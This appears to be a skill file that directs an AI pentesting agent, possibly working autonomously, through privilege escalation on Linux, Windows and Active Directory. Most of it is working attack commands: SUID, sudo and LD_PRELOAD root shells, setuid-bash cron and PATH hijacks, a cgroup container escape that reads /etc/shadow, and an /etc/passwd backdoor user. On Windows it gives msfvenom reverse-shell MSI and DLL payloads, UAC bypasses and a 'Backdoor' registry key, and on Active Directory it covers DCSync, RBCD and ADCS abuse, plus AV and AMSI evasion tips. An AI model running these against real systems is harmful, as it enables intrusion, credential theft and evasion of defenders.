---
name: privilege-escalation
description: Comprehensive privilege escalation assessment covering Linux, Windows, and Active Directory environments. Identifies and validates escalation paths from SUID/sudo/capabilities through kernel exploits, token abuse, service misconfigurations, container escapes, and AD attack chains.
---

# Privilege Escalation Skill (TA0004)

## Overview
Identify, validate, and exploit privilege escalation paths on Linux, Windows, and Active Directory
environments. This skill covers the full privesc lifecycle: enumeration → analysis → exploitation →
proof of access. Every technique maps to MITRE ATT&CK TA0004.

## Scope Rules
1. Only operate on explicitly authorized hosts and accounts.
2. Exploitation requires explicit authorization (`exploit_mode=autonomous` or documented approval).
3. Prefer misconfiguration evidence over active exploitation when possible.
4. Avoid persistence unless explicitly authorized.
5. Capture minimal proof of elevation and stop — do not pivot without authorization.
6. All kernel/memory exploits require explicit approval due to crash risk.

---

## Chain From (Input from Prior Phases)
- **Exploitation** → shell as www-data, service account, IIS AppPool, domain user
- **Credential Access** → discovered passwords/hashes → try su/runas/pass-the-hash before exploiting
- **Enumeration** → identified OS, services, architecture → narrows exploit selection

## Chain To (Output to Next Phases)
- **Root/SYSTEM obtained** → `credential_access` (dump hashes, DPAPI, SAM, NTDS.dit)
- **Root/SYSTEM obtained** → `persistence` (SSH keys, golden ticket, scheduled tasks)
- **Root/SYSTEM obtained** → `lateral_movement` (reuse credentials, pivot, pass-the-hash)
- **Domain Admin obtained** → `credential_access` → DCSync all hashes

## Decision Tree — "What Access Do You Have?"

```
[Initial Access Gained]
        │
        ├── Linux?
        │   ├── www-data / web service ────── §1.5 cron 🟢, §1.2 SUID 🟢, §1.4 caps 🟢, then MySQL UDF 🟡
        │   ├── Service account (redis/postgres/tomcat)
        │   │   ├── In docker group? ──────── Docker mount → instant root 🟡
        │   │   ├── In lxd/disk group? ────── LXD/debugfs abuse 🟡
        │   │   └── Standard service ─────── §1.3 sudo 🟢, §1.5 cron 🟢, systemd timers 🟡
        │   ├── Container? ────────────────── §1.7 escape paths 🟡 (check docker.sock, caps, privileged)
        │   └── Standard user ─────────────── Full enum: sudo 🟢 → SUID 🟢 → caps 🟢 → cron 🟢 → kernel 🔴
        │
        ├── Windows?
        │   ├── IIS AppPool / Service ─────── Check SeImpersonate → Potato family 🟡
        │   ├── Local user (admin group) ──── UAC bypass 🟡
        │   ├── Local user (standard) ─────── Services 🟡, AlwaysInstallElevated 🟡, DLL hijack 🟡
        │   └── Service account ───────────── Token privs 🟡, scheduled tasks 🟡, stored creds 🟢
        │
        └── Domain-joined?
             ├── Domain user ──────────────── Kerberoast 🟢, AS-REP 🟢, ADCS 🟡, RBCD 🟡
             ├── Service account ──────────── DCSync (if rights) 🟡, delegation abuse 🟡
             └── Computer account ─────────── RBCD 🟡, Shadow Credentials 🟡
```

### OPSEC Legend: 🟢 Quiet (enum only) | 🟡 Moderate (temp files/logs) | 🔴 Loud (crash risk/alerts)

---

## §1 — Linux Privilege Escalation

### 1.1 Initial Enumeration 🟢
```bash
# System context
id && whoami && hostname
uname -a
cat /etc/os-release
cat /proc/version

# Run automated enumeration
./linpeas.sh -a 2>&1 | tee linpeas.out
# OR
./lse.sh -l 2 2>&1 | tee lse.out

# Parse results
python3 scripts/summarize_peas.py --input linpeas.out --out privesc_summary.json
```

### 1.2 SUID/SGID Binaries 🟢 enum / 🟡 exploit
**MITRE: T1548.001 — Setuid and Setgid**
```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Find all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Find SUID owned by root (most interesting)
find / -perm -4000 -uid 0 -type f 2>/dev/null

# Cross-reference against GTFOBins
# Common escalation targets: nmap, vim, find, bash, less, more, nano, cp, mv, python, perl, ruby
```

**Exploitation patterns:**
```bash
# find with SUID
find . -exec /bin/sh -p \; -quit

# vim/vi with SUID
vim -c ':!/bin/sh'

# python with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# nmap (interactive mode, old versions)
nmap --interactive
!sh

# cp/mv — overwrite /etc/passwd
cp /tmp/evil_passwd /etc/passwd
```

### 1.3 Sudo Misconfigurations 🟢 enum / 🟡 exploit
**MITRE: T1548.003 — Sudo and Sudo Caching**
```bash
# Check sudo permissions
sudo -l

# Check sudo version (CVE-2021-3156 Baron Samedit < 1.9.5p2)
sudo --version
```

**Common sudo escalation entries:**
```bash
# (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/passwd    # then type: !/bin/bash

# (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/bash \; -quit

# (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# (ALL) NOPASSWD: /usr/bin/env
sudo env /bin/bash

# (ALL) NOPASSWD: /usr/bin/tar
sudo tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash

# LD_PRELOAD with sudo
# If env_keep includes LD_PRELOAD:
cat > /tmp/shell.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
sudo LD_PRELOAD=/tmp/shell.so <allowed_binary>
```

### 1.4 Linux Capabilities 🟢 enum / 🟡 exploit
**MITRE: T1548.001**
```bash
# Enumerate capabilities
getcap -r / 2>/dev/null

# Interesting capabilities:
# cap_setuid+ep  → set UID to 0
# cap_dac_read_search+ep → read any file
# cap_net_raw+ep → raw sockets (sniffing)
# cap_sys_admin+ep → mount filesystems, trace processes
# cap_sys_ptrace+ep → ptrace/inject into processes

# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# cap_dac_read_search — read /etc/shadow
/usr/sbin/tar cf - /etc/shadow | tar xf - --to-stdout
```

### 1.5 Cron Jobs & Scheduled Tasks 🟢 enum / 🟡 exploit
**MITRE: T1053.003 — Cron**
```bash
# Enumerate cron
cat /etc/crontab
ls -la /etc/cron.* /var/spool/cron/crontabs/ 2>/dev/null
crontab -l 2>/dev/null

# Monitor running processes for cron execution
./pspy64 -pf -i 1000

# Writable cron scripts — inject payload
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/writable_script.sh

# PATH exploitation — cron uses relative path
# Create malicious binary in writable PATH dir
echo '#!/bin/bash' > /tmp/target_binary
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/target_binary
chmod +x /tmp/target_binary
export PATH=/tmp:$PATH

# Wildcard injection (tar with * in cron)
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
```

### 1.6 Kernel Exploits 🔴
**MITRE: T1068 — Exploitation for Privilege Escalation**
```bash
# Identify kernel version
uname -r
cat /proc/version

# Run exploit suggesters
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh -k $(uname -r)

# Notable kernel exploits:
# DirtyPipe (CVE-2022-0847) — Linux 5.8 - 5.16.11
# DirtyCow (CVE-2016-5195) — Linux 2.6.22 - 4.8.3
# PwnKit (CVE-2021-4034) — pkexec, almost all Linux
# Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
# Netfilter (CVE-2022-25636) — Linux 5.4 - 5.6.10
# OverlayFS (CVE-2023-0386) — Linux 5.11 - 6.2
```
> ⚠️ Kernel exploits can crash the system. Always get explicit approval.

### 1.7 Container & Docker Escape 🟡
**MITRE: T1611 — Escape to Host**
```bash
# Detect if inside container
cat /proc/1/cgroup 2>/dev/null | grep -i docker
ls -la /.dockerenv
hostname  # random hex = likely container

# Docker socket mounted
ls -la /var/run/docker.sock
# If accessible:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
ip link add dummy0 type dummy 2>/dev/null && echo "PRIVILEGED" || echo "unprivileged"
# If privileged:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# cap_sys_admin in container
capsh --print | grep sys_admin
# Mount host filesystem
mount /dev/sda1 /mnt
```

### 1.8 NFS & File System Attacks 🟢 enum / 🔴 exploit
```bash
# Check NFS exports
showmount -e <target_ip>
cat /etc/exports

# no_root_squash exploitation
# From attacker machine:
mkdir /tmp/nfs && mount -t nfs <target>:/share /tmp/nfs
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash
# On target:
/share/rootbash -p

# Writable /etc/passwd
openssl passwd -1 -salt xyz password123
echo 'hacker:$1$xyz$...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: password123
```

### 1.9 PATH Hijacking 🟡
```bash
# Find writable directories in PATH
echo $PATH | tr ':' '\n' | while read dir; do [ -w "$dir" ] && echo "WRITABLE: $dir"; done

# Find scripts calling binaries without absolute paths
grep -r "^[^/].*(" /usr/local/bin/ /opt/ 2>/dev/null
strings /usr/local/bin/custom_app | grep -v "^/"

# Create malicious binary
echo '#!/bin/bash' > /tmp/ps
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/ps
chmod +x /tmp/ps
export PATH=/tmp:$PATH
# Run the vulnerable script/binary
```

---

## §2 — Windows Privilege Escalation

### 2.1 Token Privilege Abuse 🟡
**MITRE: T1134 — Access Token Manipulation**
```powershell
# Check current privileges
whoami /priv
whoami /all

# SeImpersonatePrivilege (service accounts, IIS, MSSQL)
# Potato family attacks:
.\PrintSpoofer.exe -i -c cmd          # Windows 10/Server 2016-2019
.\GodPotato.exe -cmd "cmd /c whoami"  # Windows 8-11, Server 2012-2022
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *  # Windows 7-10, Server 2008-2016
.\SweetPotato.exe -p cmd.exe -a "/c whoami"

# SeBackupPrivilege — copy any file
robocopy /b C:\Windows\NTDS . ntds.dit
reg save HKLM\SYSTEM C:\temp\system.hive
# Offline extraction with secretsdump.py

# SeDebugPrivilege — inject into SYSTEM process
# Migrate into winlogon.exe or lsass.exe via meterpreter or custom injector
```

### 2.2 Service Misconfigurations 🟡 enum / 🔴 exploit
**MITRE: T1574.010 — Services File Permissions Weakness, T1574.009 — Unquoted Path**
```powershell
# Automated enumeration
.\winpeas.exe servicesinfo
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"
.\SharpUp.exe audit

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
# If path = C:\Program Files\Vuln Service\binary.exe (no quotes)
# Place: C:\Program.exe or C:\Program Files\Vuln.exe

# Weak service permissions (can modify service binary path)
.\accesschk.exe /accepteula -uwcqv "Authenticated Users" * /svc
sc qc <service_name>
sc config <service_name> binpath= "C:\temp\reverse.exe"
sc stop <service_name> && sc start <service_name>

# Writable service binary — replace the .exe directly
icacls "C:\path\to\service.exe"
copy /Y C:\temp\payload.exe "C:\path\to\service.exe"
sc stop <service_name> && sc start <service_name>
```

### 2.3 AlwaysInstallElevated 🟢 enum / 🟡 exploit
**MITRE: T1548.002 — Bypass User Account Control**
```powershell
# Check if enabled (both must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
# Install with SYSTEM privileges
msiexec /quiet /qn /i evil.msi
```

### 2.4 DLL Hijacking 🟡
**MITRE: T1574.001 — DLL Search Order Hijacking**
```powershell
# Find missing DLLs (Process Monitor filter: Result=NAME NOT FOUND, Path ends with .dll)
# Or use automated tools:
.\Seatbelt.exe DLLs

# Writable DLL search paths
icacls "C:\Program Files\VulnApp\"

# Generate malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o hijack.dll
# Place in writable directory that's searched before the legitimate DLL location
```

### 2.5 Scheduled Tasks 🟢 enum / 🔴 exploit
**MITRE: T1053.005 — Scheduled Task**
```powershell
# Enumerate scheduled tasks
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.State -ne 'Disabled'}

# Check task binary permissions
icacls "C:\path\to\task_binary.exe"
# If writable — replace with payload

# Missing binary in PATH
# Create payload with the expected binary name in a writable PATH directory
```

### 2.6 Registry Autorun 🟢 enum / 🔴 exploit
**MITRE: T1547.001 — Registry Run Keys**
```powershell
# Check autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check permissions on autorun binaries
.\accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# If writable — replace binary or add new entry
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\temp\payload.exe"
```

### 2.7 UAC Bypass 🟡
**MITRE: T1548.002 — Bypass User Account Control**
```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

# fodhelper bypass (Windows 10)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe

# eventvwr bypass
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "cmd.exe" /f
eventvwr.exe

# computerdefaults bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
computerdefaults.exe
```

### 2.8 Windows Kernel Exploits 🔴
**MITRE: T1068**
```powershell
# System info for exploit matching
systeminfo
# Run Windows Exploit Suggester
python3 windows-exploit-suggester.py --database 2024-db.xlsx --systeminfo sysinfo.txt

# Notable exploits:
# PrintNightmare (CVE-2021-1675/CVE-2021-34527) — Print Spooler RCE/LPE
# EternalBlue (MS17-010) — local variant for privesc
# HiveNightmare/SeriousSAM (CVE-2021-36934) — read SAM as non-admin
# KrbRelayUp — local privesc via Kerberos relay
```

### 2.9 Credential-Based Escalation 🟢 enum / 🟡 exploit
```powershell
# Stored credentials
cmdkey /list
runas /savecred /user:administrator cmd.exe

# SAM/SYSTEM backup (if readable)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
# Extract offline:
secretsdump.py -sam sam -system system LOCAL

# DPAPI — decrypt stored credentials
mimikatz # sekurlsa::dpapi
mimikatz # vault::cred

# Autologon credentials in registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## §3 — Active Directory Privilege Escalation

### 3.1 Kerberoasting 🟢
**MITRE: T1558.003 — Kerberoasting**
```bash
# Find SPNs and request TGS tickets
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user> -hashes <lm:nt>

# Crack TGS hashes
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
```

### 3.2 AS-REP Roasting 🟢
**MITRE: T1558.004 — AS-REP Roasting**
```bash
# Find accounts with no pre-auth required
GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -format hashcat

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3.3 DCSync 🟡
**MITRE: T1003.006 — DCSync**
```bash
# Requires: Replicating Directory Changes + Replicating Directory Changes All
secretsdump.py <domain>/<user>:<password>@<dc_ip>
secretsdump.py <domain>/<user>@<dc_ip> -hashes <lm:nt>

# Mimikatz DCSync
mimikatz # lsadump::dcsync /domain:<domain> /user:Administrator
mimikatz # lsadump::dcsync /domain:<domain> /all /csv
```

### 3.4 Resource-Based Constrained Delegation (RBCD) 🟡
```bash
# Requires: write access to msDS-AllowedToActOnBehalfOfOtherIdentity
# Add computer account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'P@ssw0rd' -dc-ip <dc_ip> <domain>/<user>:<password>

# Set RBCD
rbcd.py -delegate-to <target_machine>$ -delegate-from 'EVIL$' -dc-ip <dc_ip> <domain>/<user>:<password>

# Get impersonated ticket
getST.py -spn cifs/<target_machine>.<domain> -impersonate Administrator -dc-ip <dc_ip> <domain>/EVIL$:'P@ssw0rd'

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target_machine>.<domain>
```

### 3.5 Shadow Credentials 🟡
```bash
# Requires: write access to msDS-KeyCredentialLink
# Using pywhisker
pywhisker.py -d <domain> -u <user> -p <password> --target <target_user> --action add --dc-ip <dc_ip>

# Request TGT with the generated certificate
getTGT.py -pfx <generated>.pfx -dc-ip <dc_ip> <domain>/<target_user>
```

### 3.6 ADCS Abuse (Active Directory Certificate Services) 🟡
```bash
# Enumerate vulnerable templates
certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable

# ESC1 — Enrollee supplies subject
certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template <vuln_template> -upn administrator@<domain>

# ESC4 — Vulnerable template ACLs
# Modify template, then ESC1

# ESC8 — NTLM relay to ADCS HTTP enrollment
ntlmrelayx.py -t http://<ca_server>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```

---

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| sudo -l | Password required | Try credential access, check sudo caching, try `sudo -n` |
| SUID exploitation | Binary not in GTFOBins | Check for custom SUID binaries, library injection, symlink attacks |
| LinPEAS | AV/monitoring blocks | Run manual checks from §1.1-1.9, or base64-encode and decode on target |
| Kernel exploit | Wrong kernel version | Try PwnKit (CVE-2021-4034), Baron Samedit — both work across many versions |
| Potato attack | SeImpersonate missing | Check other token privs, try service account exploit, UAC bypass |
| Kerberoasting | No crackable SPNs | Try AS-REP roast, ADCS abuse, look for writable SPNs to set |
| Container escape | Not privileged | Check capabilities (capsh --print), docker.sock, host PID namespace |
| WinPEAS | Blocked by Defender | PowerUp.ps1 (AMSI bypass first), or manual checks from §2 |

## Examples
See [examples/linux-suid-privesc.md](examples/linux-suid-privesc.md) for SUID binary to root.
See [examples/windows-potato-privesc.md](examples/windows-potato-privesc.md) for SeImpersonate to SYSTEM.
See [examples/ad-kerberoast-privesc.md](examples/ad-kerberoast-privesc.md) for Kerberoasting to DA.

---

## Deep Dives (Reference Files)
Load these for detailed techniques and commands:

| # | Topic | File | Level |
|---|-------|------|-------|
| 1 | Linux PrivEsc | `references/linux_privesc.md` | Core |
| 2 | Windows PrivEsc | `references/windows_privesc.md` | Core |
| 3 | Kernel Exploits | `references/kernel_exploits.md` | Core |
| 4 | Container Escape | `references/container_escape.md` | Core |
| 5 | AD PrivEsc | `references/ad_privesc.md` | Core |
| 6 | Baseline Enumeration | `references/baseline_enumeration.md` | Core |
| 7 | Exploitation Policy | `references/explicit_only_exploitation.md` | Policy |
| 8 | Proof of Access | `references/proof_of_access.md` | Policy |
| 9 | **Advanced Privesc** | `references/advanced_privesc.md` | **Senior** |
| 10 | **Privesc Chains** | `references/privesc_chains.md` | **Senior** |
| 11 | **OPSEC Guide** | `references/opsec_privesc.md` | **Senior** |
| 12 | **Failure Recovery** | `references/failure_recovery_privesc.md` | **Senior** |

### When to Load Senior References
- **advanced_privesc.md** — GTFOBins deep dive, Potato family matrix, third-party software, capability abuse
- **privesc_chains.md** — multi-step escalation paths with exact commands and fallbacks
- **opsec_privesc.md** — noise ratings, log footprints, cleanup procedures, SOC detection signatures
- **failure_recovery_privesc.md** — when standard approaches fail, systematic fallback procedures

---

## Output-Driven Routing

After successful privilege escalation, route to the appropriate next phase:

```
[Elevated Access Obtained]
        │
        ├── Got root/SYSTEM?
        │   ├── Dump credentials ──────────── → credential_access skill
        │   │   ├── Linux: /etc/shadow, SSH keys, .bash_history, memory
        │   │   └── Windows: SAM/SYSTEM, LSASS, DPAPI, cached creds
        │   ├── Establish persistence ─────── → persistence skill (if authorized)
        │   │   ├── Linux: SSH key, cron backdoor, systemd service
        │   │   └── Windows: scheduled task, service, registry autorun
        │   └── Pivot to other hosts ─────── → lateral_movement skill
        │       ├── Reuse discovered creds
        │       ├── Pass-the-hash / pass-the-ticket
        │       └── SSH with found keys
        │
        ├── Got Domain Admin?
        │   ├── DCSync all hashes ─────────── → credential_access (secretsdump.py)
        │   ├── Golden Ticket ─────────────── → persistence (krbtgt hash)
        │   └── Full domain compromise ────── → document and report
        │
        └── Got higher-priv but not root?
            ├── Can we chain further? ─────── → re-run privesc from new context
            └── Sufficient for objective? ──── → document and report
```

---

## Evidence Collection
1. `privesc_summary.json` — automated enumeration highlights (from PEAS output via `summarize_peas.py`)
2. `evidence.json` — misconfiguration proof with redactions
3. `findings.json` — risk impact notes per vector
4. `priv_esc.json` — final escalation path documentation

## Success Criteria
- All viable escalation paths identified with evidence
- Minimal proof of elevation captured when authorized
- No unauthorized changes or persistence
- Findings mapped to MITRE ATT&CK techniques
- Clear remediation recommendations per finding
